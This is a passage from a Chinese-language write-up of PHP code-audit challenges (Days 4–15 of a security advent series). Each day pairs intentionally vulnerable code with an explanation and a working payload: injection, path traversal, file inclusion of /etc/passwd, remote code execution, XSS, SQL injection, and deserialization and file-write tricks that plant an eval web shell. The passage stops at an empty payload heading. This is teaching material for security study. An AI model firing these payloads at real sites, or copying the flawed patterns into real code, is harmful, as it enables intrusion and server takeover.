<pre><code>file_put_contents(&quot;result.txt&quot;, $_GET[&#39;file&#39;]);</code></pre>
<p>这样就完成了攻击。</p>
<h2 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h2><p><strong>Code:</strong></p>
<pre><code class="php">class Login &#123;
  public function __construct($user, $pass) &#123;
    $this-&gt;loginViaXml($user, $pass);
  &#125;

  public function loginViaXml($user, $pass) &#123;
    if (
      (!strpos($user, &#39;&lt;&#39;) || !strpos($user, &#39;&gt;&#39;)) &amp;&amp;
      (!strpos($pass, &#39;&lt;&#39;) || !strpos($pass, &#39;&gt;&#39;))
    ) &#123;
      $format = &#39;&lt;?xml version=&quot;1.0&quot;?&gt;&#39; .
        &#39;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&#39;;
      $xml = sprintf($format, $user, $pass);
      $xmlElement = new SimpleXMLElement($xml);
      // Perform the actual login.
      $this-&gt;login($xmlElement);
    &#125;
  &#125;
&#125;

new Login($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);</code></pre>
<p><strong>漏洞：</strong></p>
<p>问题出在<code>strpos</code>函数和PHP的自动类型转换上。eg：</p>
<pre><code class="php">php &gt; var_dump(strpos(&#39;abcd&#39;,&#39;a&#39;));
int(0)
php &gt; var_dump(strpos(&#39;abcd&#39;,&#39;x&#39;));
bool(false)
php &gt; var_dump(0==false);
bool(true)</code></pre>
<p>如果我们传入的<code>username</code>和<code>password</code>的首位字符是<code>&lt;</code>或者是<code>&gt;</code>就可以绕过限制，那么最后的pyaload就是：</p>
<pre><code>username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</code></pre>
<p>最终传入到<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p>
<h2 id="Day-5-Postcard"><a href="#Day-5-Postcard" class="headerlink" title="Day 5 - Postcard"></a>Day 5 - Postcard</h2><p><strong>code:</strong></p>
<pre><code class="php">class Mailer &#123;
  private function sanitize($email) &#123;
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;
      return &#39;&#39;;
    &#125;

    return escapeshellarg($email);
  &#125;

  public function send($data) &#123;
    if (!isset($data[&#39;to&#39;])) &#123;
      $data[&#39;to&#39;] = &#39;none@ripstech.com&#39;;
    &#125; else &#123;
      $data[&#39;to&#39;] = $this-&gt;sanitize($data[&#39;to&#39;]);
    &#125;

    if (!isset($data[&#39;from&#39;])) &#123;
      $data[&#39;from&#39;] = &#39;none@ripstech.com&#39;;
    &#125; else &#123;
      $data[&#39;from&#39;] = $this-&gt;sanitize($data[&#39;from&#39;]);
    &#125;

    if (!isset($data[&#39;subject&#39;])) &#123;
      $data[&#39;subject&#39;] = &#39;No Subject&#39;;
    &#125;

    if (!isset($data[&#39;message&#39;])) &#123;
      $data[&#39;message&#39;] = &#39;&#39;;
    &#125;

    mail($data[&#39;to&#39;], $data[&#39;subject&#39;], $data[&#39;message&#39;],
      &#39;&#39;, &quot;-f&quot; . $data[&#39;from&#39;]);
  &#125;
&#125;

$mailer = new Mailer();
$mailer-&gt;send($_POST);</code></pre>
<p><strong>漏洞：</strong></p>
<p>考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p>
<pre><code class="php">bool mail (
    string $to ,
    string $subject ,
    string $message [,
    string $additional_headers [,
    string $additional_parameters ]]
)</code></pre>
<p>其参数含义分别表示如下：</p>
<blockquote>
<ul>
<li>to，指定邮件接收者，即接收人</li>
<li>subject，邮件的标题</li>
<li>message，邮件的正文内容</li>
<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
</ul>
</blockquote>
<p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
<blockquote>
<ul>
<li><p>-O option = value</p>
<p>QueueDirectory = queuedir 选择队列消息</p>
</li>
<li><p>-X logfile</p>
<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
</li>
<li><p>-f from email</p>
<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
</li>
</ul>
</blockquote>
<p>eg:</p>
<pre><code class="php">&lt;?php
  $to = &#39;Alice@example.com&#39;;
    $subject = &#39;Hello Alice!&#39;;
    $message = &#39;&lt;?php phpinfo(); ?&gt;&#39;;
    $header = &#39;CC: somebodyelse@example.com&#39;;
    $options = &#39;-OQueueDirectory = /tmp -X /var/www/html/shell.php&#39;;
    mail($to, $subject, $message, $header, $options);
?&gt;</code></pre>
<p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>/var/www/html/rce.php</strong> 中写入如下数据：</p>
<pre><code>17220 &lt;&lt;&lt; To: Alice@example.com
 17220 &lt;&lt;&lt; Subject: Hello Alice!
 17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php
 17220 &lt;&lt;&lt; CC: somebodyelse@example.com
 17220 &lt;&lt;&lt;
 17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;
 17220 &lt;&lt;&lt; [EOF]</code></pre>
<p>然后是过滤函数，这里<strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸。</p>
<p>参考：</p>
<blockquote>
<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md</a></p>
<p><a href="https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php">https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php</a></p>
<p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
</blockquote>
<h2 id="Day-6-Frost-Pattern"><a href="#Day-6-Frost-Pattern" class="headerlink" title="Day 6 - Frost Pattern"></a>Day 6 - Frost Pattern</h2><p><strong>code:</strong></p>
<pre><code class="php">class TokenStorage &#123;
    public function performAction($action, $data) &#123;
        switch ($action) &#123;
            case &#39;create&#39;:
                $this-&gt;createToken($data);
                break;
            case &#39;delete&#39;:
                $this-&gt;clearToken($data);
                break;
            default:
                throw new Exception(&#39;Unknown action&#39;);
        &#125;
    &#125;

    public function createToken($seed) &#123;
        $token = md5($seed);
        file_put_contents(&#39;/tmp/tokens/&#39; . $token, &#39;...data&#39;);
    &#125;

    public function clearToken($token) &#123;
        $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);
        unlink(&#39;/tmp/tokens/&#39; . $file);
    &#125;
&#125;

$storage = new TokenStorage();
$storage-&gt;performAction($_GET[&#39;action&#39;], $_GET[&#39;data&#39;]);</code></pre>
<p><strong>漏洞：</strong></p>
<p>正则表达式有问题，开发者本来的意思应该是将<code>a-z</code>和<code>.-_</code>这三个符号外的全部替换为空，这样<code>../../../xx</code>就无法使用，防止进行路径穿越。但是没对<code>-</code>进行转义，所以匹配范围就变成了<code>a-z</code>和<code>.</code> 字符到 <code>_</code> 字符之间的所有字符。</p>
<table>
<thead>
<tr>
<th align="left">正则表达式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[^a-zA-Z]</td>
<td align="left">它匹配任何不包含从a到z、A到Z的字符的字符串。</td>
</tr>
</tbody></table>
<pre><code>&gt;&gt;&gt; ord(&#39;.&#39;)
46
&gt;&gt;&gt; ord(&#39;_&#39;)
95
&gt;&gt;&gt; ord(&#39;/&#39;)
47</code></pre>
<p>完美避开了<code>../</code>字符，这样就造成了目录穿越，上面代码可以进行任意文件删除了。</p>
<p>payload：</p>
<pre><code>action=delete&amp;data=../../config.php</code></pre>
<h2 id="Day-7-Bells"><a href="#Day-7-Bells" class="headerlink" title="Day 7 - Bells"></a>Day 7 - Bells</h2><p><strong>code:</strong></p>
<pre><code class="php">function getUser($id) &#123;
    global $config, $db;
    if (!is_resource($db)) &#123;
        $db = new MySQLi(
            $config[&#39;dbhost&#39;],
            $config[&#39;dbuser&#39;],
            $config[&#39;dbpass&#39;],
            $config[&#39;dbname&#39;]
        );
    &#125;
    $sql = &quot;SELECT username FROM users WHERE id = ?&quot;;
    $stmt = $db-&gt;prepare($sql);
    $stmt-&gt;bind_param(&#39;i&#39;, $id);
    $stmt-&gt;bind_result($name);
    $stmt-&gt;execute();
    $stmt-&gt;fetch();
    return $name;
&#125;

$var = parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);
parse_str($var[&#39;query&#39;]);
$currentUser = getUser($id);
echo &#39;&lt;h1&gt;&#39;.htmlspecialchars($currentUser).&#39;&lt;/h1&gt;&#39;;</code></pre>
<p><strong>漏洞：</strong></p>
<p><code>parse_str</code>导致了变量覆盖漏洞，通过它可以覆盖掉<code>$config</code>变量，使数据库配置信息可控。</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.parse-str.php"><strong>parse_str</strong></a></p>
<p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
<p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p>
<p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p>
</blockquote>
<p>Payload:</p>
<pre><code>http://host/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=test&amp;id=1</code></pre>
<h2 id="Day-8-Candle"><a href="#Day-8-Candle" class="headerlink" title="Day 8 - Candle"></a>Day 8 - Candle</h2><p><strong>code:</strong></p>
<pre><code class="php">header(&quot;Content-Type: text/plain&quot;);

function complexStrtolower($regex, $value) &#123;
    return preg_replace(
        &#39;/(&#39; . $regex . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $value
    );
&#125;

foreach ($_GET as $regex =&gt; $value) &#123;
    echo complexStrtolower($regex, $value) . &quot;\n&quot;;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
</blockquote>
<p>导致问题出在<code>/e</code>上，/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码执行（在适当的逆向引用替换完之后）。第二个参数即用来替换的参数是<code>strtolower(&quot;\\1&quot;)</code>，<code>strtolower</code>是转换小写字母的函数，<code>\\1</code>表示正则匹配到的第一个内容，这是正则表达式反向引用的知识。</p>
<blockquote>
<p><strong>反向引用</strong></p>
<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
</blockquote>
<p>现在可用的参数有<code>preg_replace</code>的第一、三参数，那么我们就可以控制replacement参数来执行php代码。</p>
<p>正则参数使用<code>.*</code>来匹配任何字符是最方便的选择，但是这里通过GET传入后发现没有匹配到任何字符，因为我们传上去的<code>.*</code> 变成了 <code>_*</code>，这是由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。那么可以换用<code>\S*</code>来达到相同的效果。（\S：用于匹配除单个空格符之外的所有字符）</p>
<p>再就是要执行的PHP代码，要匹配到 <strong>{${phpinfo()}}**才能执行 **phpinfo</strong> 函数。这实际上是 <a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。</p>
<p>Payload1:<code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code>，利用了反向引用，在直接写进代码时可成功执行，但由于特殊符号<code>.</code>通过GET方法传入时会被替换为<code>_</code>，从而导致无法成功匹配。</p>
<p>所以最后payload为：<code>\S*=&#123;$&#123;phpinfo()&#125;&#125; </code></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
</blockquote>
<h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><p><strong>code:</strong></p>
<pre><code class="php">class LanguageManager
&#123;
    public function loadLanguage()
    &#123;
        $lang = $this-&gt;getBrowserLanguage();
        $sanitizedLang = $this-&gt;sanitizeLanguage($lang);
        require_once(&quot;/lang/$sanitizedLang&quot;);
    &#125;

    private function getBrowserLanguage()
    &#123;
        $lang = $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;] ?? &#39;en&#39;;
        return $lang;
    &#125;

    private function sanitizeLanguage($language)
    &#123;
        return str_replace(&#39;../&#39;, &#39;&#39;, $language);
    &#125;
&#125;

(new LanguageManager())-&gt;loadLanguage();</code></pre>
<p><strong>漏洞：</strong></p>
<p>存在任意文件包含漏洞，问题出在<code>str_replace(&#39;../&#39;, &#39;&#39;, $language)</code>，问题就是这个包含只是单次替换而不是循环替换，所以这种替换就很容易被绕过。只需要叠写一下就好了，如<code>...//</code>。而且<code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code>这个变量是客户端可控的。</p>
<p>payload：</p>
<pre><code>Accept-Language:  .//....//....//etc/passwd</code></pre>
<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><p><strong>code:</strong></p>
<pre><code class="php">extract($_POST);

function goAway() &#123;
    error_log(&quot;Hacking attempt.&quot;);
    header(&#39;Location: /error/&#39;);
&#125;

if (!isset($pi) || !is_numeric($pi)) &#123;
    goAway();
&#125;

if (!assert(&quot;(int)$pi == 3&quot;)) &#123;
    echo &quot;This is not pi.&quot;;
&#125; else &#123;
    echo &quot;This might be pi.&quot;;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<blockquote>
<ol>
<li>使用header()进行跳转的时候没有使用<code>exit()</code>或者是<code>die()</code>，导致后续的代码任然可以执行。</li>
<li><code>assert()</code>能够执行<code>&quot;</code>中的代码,如<code>assert(&quot;(int)phpinfo()&quot;);</code></li>
</ol>
</blockquote>
<p>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量。程序对 <strong>pi</strong> 变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong> 变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>/error/</strong> 页面。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong> 变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p>
<p>例如我们的payload为：<strong>pi=phpinfo()</strong> ，然后程序就会执行这个 <strong>phpinfo</strong> 函数。用 <strong>BurpSuite</strong> ，可以清晰的看到程序执行了 <strong>phpinfo</strong> 函数。</p>
<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><p><strong>code:</strong></p>
<pre><code class="php">class Template &#123;
    public $cacheFile = &#39;/tmp/cachefile&#39;;
    public $template = &#39;&lt;div&gt;Welcome back %s&lt;/div&gt;&#39;;

    public function __construct($data = null) &#123;
        $data = $this-&gt;loadData($data);
        $this-&gt;render($data);
    &#125;

    public function loadData($data) &#123;
        if (substr($data, 0, 2) !== &#39;O:&#39; 
        &amp;&amp; !preg_match(&#39;/O:\d:/&#39;, $data)) &#123;
            return unserialize($data);
        &#125;
        return [];
    &#125;

    public function createCache($file = null, $tpl = null) &#123;
        $file = $file ?? $this-&gt;cacheFile;
        $tpl = $tpl ?? $this-&gt;template;
        file_put_contents($file, $tpl);
    &#125;

    public function render($data) &#123;
        echo sprintf(
            $this-&gt;template,
            htmlspecialchars($data[&#39;name&#39;])
        );
    &#125;

    public function __destruct() &#123;
        $this-&gt;createCache();
    &#125;
&#125;

new Template($_COOKIE[&#39;data&#39;]);</code></pre>
<p><strong>漏洞：</strong></p>
<p>代码中的<code>??</code>是php7中新的语法糖。<code>??</code>的含义是</p>
<blockquote>
<p>由于日常使用中存在大量同时使用三元表达式和 isset()的情况， 我们添加了null合并运算符 (??) 这个语法糖。如果变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。</p>
</blockquote>
<p>这道题目使用了<code>unserialize()</code>和<code>__destruct</code>，是考察反序列化漏洞的典型套路。题目的本意很简单，将页面上的内容<code>Welcome back %s</code>最后输出到<code>/tmp/cachefile</code>文件中。而题目最大的问题是需要绕过：</p>
<ol>
<li><code>substr($data, 0, 2) !== &#39;O:&#39;</code></li>
<li><code>preg_match(&#39;/O:\d:/&#39;, $data)</code></li>
</ol>
<p>第一个通过数组的方式就可以绕过，而第二个的绕过则需要利用到PHP中的反序列化的一个BUG，只需要在对象长度前添加一个+号，即o:14-&gt;o:+14，这样就可以绕过正则匹配。关于这个BUG的具体分析，可以参见<a href="http://www.phpbug.cn/archives/32.html">php反序列unserialize的一个小特性</a>。</p>
<p>接下来就是构造payload了：</p>
<pre><code class="php">class Template &#123;
    public $cacheFile = &#39;/var/www/html/shell.php&#39;;
    public $template = &#39;&lt;?php eval($_POST[xx]);?&gt;&#39;;
&#125;
$mytemp = new Template();
$myarray = array($mytemp);
$myarray = serialize($myarray);
var_dump($myarray);</code></pre>
<pre><code>string(124) &quot;a:1:&#123;i:0;O:8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:8:&quot;template&quot;;s:25:&quot;&lt;?php eval($_POST[xx]);?&gt;&quot;;&#125;&#125;&quot;</code></pre>
<p>由于需要绕过<code>preg_match(&#39;/O:\d:/&#39;, $data)</code>，需要将<code>O:8</code>变为<code>O:+8</code>,则最后的payload为：</p>
<pre><code class="php">a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:8:&quot;template&quot;;s:25:&quot;&lt;?php eval($_POST[xx]);?&gt;&quot;;&#125;&#125;</code></pre>
<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><p><strong>code:</strong></p>
<pre><code class="php">$sanitized = [];

foreach ($_GET as $key =&gt; $value) &#123;
    $sanitized[$key] = intval($value);
&#125;

$queryParts = array_map(function ($key, $value) &#123;
    return $key . &#39;=&#39; . $value;
&#125;, array_keys($sanitized), array_values($sanitized));

$query = implode(&#39;&amp;&#39;, $queryParts);

echo &quot;&lt;a href=&#39;/images/size.php?&quot; .
    htmlentities($query) . &quot;&#39;&gt;link&lt;/a&gt;&quot;;</code></pre>
<p><strong>漏洞：</strong></p>
<p>本题目的关键是在于<code>$sanitized[$key] = intval($value);</code>，同时漏洞也是出自于<code>$sanitized[$key] = intval($value);</code>。这行代码主要就是的作用就是传入的<code>$value</code>进行过滤变为<code>intval($value)</code>，之后再次经过<code>htmlentities</code>进行过滤拼接到<code>&lt;a&gt;</code>标签中作为<code>/images/size.php</code>的参数。</p>
<p>上述代码的问题在于：</p>
<ol>
<li><code>$sanitized[$key] = intval($value)</code>只过滤了value，没有对key进行过滤；</li>
<li><code>htmlentities</code>默认情况下不会对单引号进行转义。</li>
</ol>
<p>那么我们的XSS攻击就可以通过在标签<code>&lt;a&gt;</code>中增加一个<code>onclick</code>的点击事件触发。最后的payload如下<code>/?a&#39;onclick%3dalert(1)%2f%2f=c</code></p>
<h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><p><strong>code:</strong></p>
<pre><code class="php">class LoginManager &#123;
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) &#123;
        $this-&gt;em = DoctrineManager::getEntityManager();
        $this-&gt;user = $user;
        $this-&gt;password = $password;
    &#125;

    public function isValid() &#123;
        $user = $this-&gt;sanitizeInput($this-&gt;user);
        $pass = $this-&gt;sanitizeInput($this-&gt;password);

        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
            -&gt;select(&quot;COUNT(p)&quot;)
            -&gt;from(&quot;User&quot;, &quot;u&quot;)
            -&gt;where(&quot;user = &#39;$user&#39; AND password = &#39;$pass&#39;&quot;);
        $query = $queryBuilder-&gt;getQuery();
        return boolval($query-&gt;getSingleScalarResult());
    &#125;

    public function sanitizeInput($input, $length = 20) &#123;
        $input = addslashes($input);
        if (strlen($input) &gt; $length) &#123;
            $input = substr($input, 0, $length);
        &#125;
        return $input;
    &#125;
&#125;

$auth = new LoginManager($_POST[&#39;user&#39;], $_POST[&#39;passwd&#39;]);
if (!$auth-&gt;isValid()) &#123;
    exit;
&#125;</code></pre>
<p><strong>漏洞：</strong></p>
<p>这是段登录认证代码，通过POST传入user和passwd参数，然后通过<code>isValid</code>函数验证合法性。在该函数内，user和password变量都会经过<code>sanitizeInput</code>函数处理后再带入sql语句执行。</p>
<p>看一下<code>sanitizeInput</code>是怎么处理的，先使用<code>addslashes</code>处理，然后限制长度，超过20就截取前20字符。</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p>
<pre><code>string addslashes ( string $str )</code></pre>
<p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NUL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p>
</blockquote>
<p>按说把引号都转义了就不用引发注入了，但是利用substr函数，在<code>\</code>和<code>&#39;</code>之间截取，利用\转义sql语句中原本用来包裹<code>$user</code>的后单引号，起到如下效果：</p>
<pre><code class="php">select count(p) from user u where user = &#39;1234567890123456789\&#39; AND password = &#39;$pass&#39;</code></pre>
<p>然后让user=<code>or 1=1#</code>，sql语句就变成了：</p>
<pre><code class="php">select count(p) from user where user = &#39;1234567890123456789\&#39; AND password = &#39;or 1=1#&#39;</code></pre>
<p>此我们可以保证带入数据库执行的结果为 <strong>True</strong> ，然后就能够顺利地通过验证。</p>
<h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><p><strong>code:</strong></p>
<pre><code class="php">class Carrot &#123;
    const EXTERNAL_DIRECTORY = &#39;/tmp/&#39;;
    private $id;
    private $lost = 0;
    private $bought = 0;

    public function __construct($input) &#123;
        $this-&gt;id = rand(1, 1000);

        foreach ($input as $field =&gt; $count) &#123;
            $this-&gt;$field = $count++;
        &#125;
    &#125;

    public function __destruct() &#123;
        file_put_contents(
            self::EXTERNAL_DIRECTORY . $this-&gt;id,
            var_export(get_object_vars($this), true)
        );
    &#125;
&#125;

$carrot = new Carrot($_GET);</code></pre>
<p><strong>漏洞：</strong></p>
<p>任意文件写，可以导致getshell。这里<code>$this-&gt;$field = $count++;</code>，由于、<code>a++</code>和<code>++a</code>的差别，这里<code>$field</code>仍是<code>$count</code>的值，同时<code>$this-&gt;$field</code>可以修改类的任何属性造成了变量覆盖。例如：<code>id=../../../../var/www/html/shell.php</code>。就控制了写文件的路径。</p>
<p>再就是写入文件的内容，<code>var_export(get_object_vars($this), true)</code>，作用是将类中各属性转换成数组然后再转成字符串形式。</p>
<blockquote>
<p>get_object_vars — 返回由对象属性组成的关联数组</p>
<p>var_export — 输出或返回一个变量的字符串表示</p>
</blockquote>
<p>这样一来，全部的属性都会输出，而且这个过程没有转义，我们就可以构造新的属性进行写入。</p>
<p>通过闭合数组或者将shell内容用<code>&quot;</code>包裹起来达到目的。</p>
<pre><code class="php">payload1:
shell=&quot;&lt;?php eval($_POST[xx]); ?&gt;&quot;
string(131) &quot;array (
  &#39;id&#39; =&gt; &#39;../../../var/www/html/shell.php&#39;,
  &#39;lost&#39; =&gt; 0,
  &#39;bought&#39; =&gt; 0,
  &#39;shell&#39; =&gt; &#39;&quot;&lt;?php eval($_POST[xx]); ?&gt;&quot;&#39;,
)&quot;

payload2:
shell=&#39;,),&lt;?php phpinfo(); ?&gt;//
string(129) &quot;array (
  &#39;id&#39; =&gt; &#39;../../../var/www/html/shell.php&#39;,
  &#39;lost&#39; =&gt; 0,
  &#39;bought&#39; =&gt; 0,
  &#39;shell&#39; =&gt; &#39;\&#39;,),&lt;?php phpinfo(); ?&gt;//&#39;,
)&quot;</code></pre>
<p>如果按照开发者原本意思进行自增操作，变为<code>++$count</code>也是可以利用的。</p>
<pre><code class="php">$test = 123; echo ++$test;      // 124
$test = &#39;123&#39;; echo ++$test;    // 124
$test = &#39;1ab&#39;; echo ++$test;    // &#39;1ac&#39;
$test = &#39;ab1&#39;; echo ++$test;    // &#39;ab2&#39;
$test = &#39;a1b&#39;; echo ++$test;    // &#39;a1c&#39;
$test =array(2,&#39;name&#39;=&gt;&#39;wyj&#39;); echo ++$test;    //Array123</code></pre>
<p>通过分析发现，在进行<code>++</code>操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。<br>payload变为：</p>
<pre><code class="php">id=../../var/www/html/test/shell.php4
or
id=../../var/www/html/test/shell.pho</code></pre>
<h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><p><strong>code:</strong></p>
<pre><code class="php">class Redirect &#123;
    private $websiteHost = &#39;www.vulnspy.com&#39;;

    private function setHeaders($url) &#123;
        $url = urldecode($url);
        header(&quot;Location: $url&quot;);
    &#125;

    public function startRedirect($params) &#123;
        $parts = explode(&#39;/&#39;, $_SERVER[&#39;PHP_SELF&#39;]);
        $baseFile = end($parts);
        $url = sprintf(
            &quot;%s?%s&quot;,
            $baseFile,
            http_build_query($params)
        );
        $this-&gt;setHeaders($url);
    &#125;
&#125;

if ($_GET[&#39;redirect&#39;]) &#123;
    (new Redirect())-&gt;startRedirect($_GET[&#39;params&#39;]);
&#125;</code></pre>
<p>这一关主要考察的是 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 引发的一个任意网址跳转漏洞</p>
<p>首先，分析一下程序的运行</p>
<ul>
<li>如果有 <code>$_GET[&#39;redirect&#39;]</code> 参数，那么就 New 一个 <code>Redirect</code> 对象，同时调用 <code>Redirect</code> 类的 <code>startRedirect</code> 方法</li>
<li><code>startRedirect</code> 函数接受一个 <strong>GET</strong> 类型的 <strong>params</strong> 参数，然后在 <code>explode()</code> 函数中，将 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 得到的值，以 <strong>/</strong> 分割成一个 <code>$parts</code> 数组。</li>
<li><code>$baseFile</code> 的值为 <strong>$parts</strong> 数组的最后一个值</li>
<li><strong>$url</strong> 的值为 <code>$baseFile?http_build_query($params)</code> ，其中的 <strong>http_build_query()</strong> 函数就是一个将参数进行URL编码的一个操作，比如 <strong>$params=’test=123’</strong></li>
<li>然后调用 <strong>setHeaders</strong> 函数，首先解码 <strong>$url</strong> 参数，然后 <strong>header()</strong> 函数直接跳转 <strong>$url</strong></li>
</ul>
<p><strong>$_SERVER[‘PHP’]</strong> 存在的问题：</p>
<p>初看这个程序没什么问题，但是PHP自带的*<em>$_SERVER[‘PHP_SELF’]** 参数是可以控制的。其中 <strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：*<em><a href="http://www.test.com/redict/index.php/">http://www.test.com/redict/index.php\</a></em></em>，那么*<em>PHP_SELF** 就是 <strong>/redict/index.php</strong> 。但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：*<em><a href="http://www.test.com/redict/index.php/admin/">http://www.test.com/redict/index.php/admin\</a></em></em>，那么*<em>PHP_SELF*</em>就是**/redict/index.php/admin** 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p>
<p>双编码问题：</p>
<p>URL本来是被浏览器编码过一次，服务器接收到来自浏览器URL请求的时候，会将URL解码一次，由于在程序中我们看到有 <strong>urldecode()</strong> 函数存在，它会再次解码一次URL，此时双编码URL就可以利用，用于绕过某些关键词检测。比如将 <strong>/</strong> 编码为： <strong>%252f</strong></p>
<p>Payload:</p>
